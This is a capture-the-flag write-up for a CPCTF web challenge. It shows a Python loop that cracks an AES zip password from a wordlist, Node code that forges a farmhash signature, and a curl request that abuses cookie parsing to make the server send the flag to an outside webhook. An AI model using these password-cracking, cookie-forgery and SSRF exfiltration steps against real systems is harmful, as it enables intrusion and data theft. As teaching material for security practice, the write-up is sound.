### Final Answer

**Flag:** `cpctf{l1br4r13s_c4n_b3_d4ng3r0us}`

---

### Problem Understanding

The challenge gave two clues: a live web page called "best searcher" and a downloaded archive related to "very good version control." At first glance, the web app looked like a simple search form that redirects to Google, which can make it seem harmless. The real task was to reverse and trust the local artifact first, then use that knowledge to craft one precise request against the remote instance. In short: this was not a UI puzzle, it was a server-side request manipulation problem.

---

### Thought Process

I started from the zip because it was the only artifact I could inspect fully offline. The outer archive was AES-encrypted, so the first practical goal was to recover its password and extract source code. Once the Node.js code was visible, the key behavior appeared in `/search`: the server accepted two cookies (`X-Signed` and `X-Search-Query`), validated them with `farmhash`, and then performed a server-side GET with the flag in a custom header.

The first exploit attempts failed and returned Google HTML, which proved the app was falling back to the default URL. That failure mattered: it meant validation was still not passing. I then checked type handling and cookie parsing behavior. `cookie-parser` supports JSON cookies via the `j:` prefix, which allows numeric values to be parsed as numbers. This solved the strict-comparison issue and made the request path reach my webhook URL instead of Google.

Finally, I verified the outbound request in webhook logs and extracted the flag directly from the `x` header.

---

### Tools and Techniques Used

- **Linux / Ubuntu (WSL):** `file`, `unzip`, `7z`, `strings`, `xxd`, `curl`, `grep`, `sed`, `wc`
- **Node.js / npm:** installed and used `farmhash` (and matched challenge dependency behavior)
- **Python 3:** used `pyzipper` for AES zip extraction and lightweight request automation
- **Webhook.site:** used to capture server-side outbound requests and headers

---

### Step-by-Step Solution

#### Step 1 — Initial Inspection

First I checked the archive type and contents.

```bash
file wow_2.zip
unzip -l wow_2.zip
```

This showed the archive was password-protected AES ZIP containing another zip (`wow.zip`). Standard extraction failed due to encryption, so I switched to `pyzipper` for AES support.

I also inspected metadata and structure to confirm it was not a fake extension or polyglot.

```bash
python3 - <<'PY'
import zipfile
z = zipfile.ZipFile('wow_2.zip')
for i in z.infolist():
    print(i.filename, i.compress_type, i.flag_bits)
PY
```

That confirmed encryption flags and justified a password-cracking step.

---

#### Step 2 — Locating the Hidden Data

I used a common-password wordlist and tested passwords programmatically until extraction succeeded.

```bash
python3 - <<'PY'
import pyzipper, io
data = open('wow_2.zip','rb').read()
for pw in open('/home/thoran/CPCTF/level_8/top100k.txt', 'r', errors='ignore'):
    pw = pw.strip()
    try:
        z = pyzipper.AESZipFile(io.BytesIO(data))
        z.setpassword(pw.encode())
        z.extractall('./extracted')
        print('FOUND:', pw)
        break
    except Exception:
        pass
PY
```

Password found: `iloveyou`.

After extraction, `wow.zip` contained a Node.js app. Reading `index.js` exposed the real attack surface in the `/search` endpoint: cookie-based URL selection + server-side fetch + flag in outbound header.

---

#### Step 3 — Extraction and Decoding

This challenge did not require base64 decoding. The final extraction step was an SSRF-style request that forced the server to send the flag to my webhook.

Key points that made it work:

1. The URL had to match exactly (including trailing slash).
2. `X-Signed` had to be accepted as a number using JSON-cookie syntax (`j:<number>`).
3. The request count stayed low (one precise exploit request).

Compute signature for the exact callback URL:

```bash
node - <<'NODE'
const fh=require('/tmp/farm331/node_modules/farmhash');
const u='https://webhook.site/21ea92e7-f752-4162-8445-29d088bcab52/';
console.log(fh.fingerprint32(u));
NODE
```

Result:

```text
2208788231
```

Send exploit request:

```bash
curl -s -i -X POST 'http://10.4.16.150:6100/search' \
  -H 'Cookie: X-Signed=j:2208788231; X-Search-Query=https://webhook.site/21ea92e7-f752-4162-8445-29d088bcab52/'
```

Server response changed from Google HTML fallback to webhook default content, indicating it actually fetched my callback URL.

Then I retrieved webhook logs:

```bash
curl -s 'https://webhook.site/token/21ea92e7-f752-4162-8445-29d088bcab52/requests?sorting=newest'
```

The latest request headers contained:

```text
x: cpctf{l1br4r13s_c4n_b3_d4ng3r0us}
```

---

#### Step 4 — Flag

Final flag:

```text
cpctf{l1br4r13s_c4n_b3_d4ng3r0us}
```

Format check passed (`cpctf{...}`).

---

### Why This Worked

- The web app trusted client-controlled cookies to choose a server-side target URL.
- The signature check used a predictable non-secret hash function (`farmhash`), not a keyed MAC.
- Cookie parsing allowed type manipulation via JSON-cookie syntax (`j:`), which helped satisfy strict comparison behavior.
- The server leaked sensitive data by attaching the flag to outbound request headers.
- A webhook endpoint provided a clean observation point for exfiltrated headers.

---

### Lessons Learned

- Always solve from artifacts first when remote access is limited; local code usually reveals the real path.
- "Hashing" is not authentication unless a secret key is involved.
- In web exploitation, exact input bytes matter (for example, trailing slashes in signed URLs).
- Type handling in JavaScript (`string` vs `number`) can make or break an exploit.
- Keep exploit traffic minimal and hypothesis-driven, especially when the challenge warns about request limits.

---

**Final Flag:** `cpctf{l1br4r13s_c4n_b3_d4ng3r0us}`
